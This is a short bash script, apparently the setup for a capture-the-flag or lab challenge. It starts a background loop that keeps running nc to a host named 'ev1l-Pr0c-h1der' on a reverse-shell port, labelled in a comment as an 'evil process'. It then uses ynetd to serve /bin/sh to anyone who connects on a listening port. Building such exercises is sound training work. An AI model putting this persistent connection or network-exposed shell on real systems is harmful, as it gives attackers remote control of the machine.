#!/bin/bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 <listen port> <rev shell port>"
    exit 1
fi

USER="ubuntu"
LISTEN_PORT=$1
REV_SHELL_PORT=$2

# start some evil process
while true; do
    nc ev1l-Pr0c-h1der $REV_SHELL_PORT
    sleep 1
done &

echo "[INFO] Starting ynetd on port $LISTEN_PORT for user $USER"
./ynetd -p $LISTEN_PORT -u $USER "/bin/sh 2>&1"